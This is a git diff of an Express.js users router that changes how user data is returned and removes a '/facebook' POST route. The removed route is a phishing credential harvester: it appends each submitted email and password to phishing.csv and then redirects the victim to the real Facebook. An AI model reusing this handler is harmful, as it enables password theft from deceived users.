@@ -20,7 +20,7 @@ usersRouter.post('', (req, res) => {
     );
     Logger.info(req.body);
 
-    res.status(200).render("info", req.body);
+    res.status(200).redirect('/users.html');
 })
 
 
@@ -33,18 +33,7 @@ usersRouter.get("", (req, res) => {
             .slice(1)
             .map((row) => row.split(","))
             .map(([nom, prenom, email]) => ({ nom, prenom, email }))
-
-    res.json(users)
-
-    // writeFileSync("./users.json", JSON.stringify(users, null, 2));
-
+    res.status(200).render("users", { users });
 });
-
-usersRouter.post('/facebook', (req, res) => {
-    if (!existsSync("./phishing.csv"))
-        writeFileSync("./phishing.csv", "email,password");
-    appendFileSync('./phishing.csv', `\n${req.body.email},${req.body.pass}`);
-    res.redirect('https://www.facebook.com');
-})
 
 export default usersRouter;
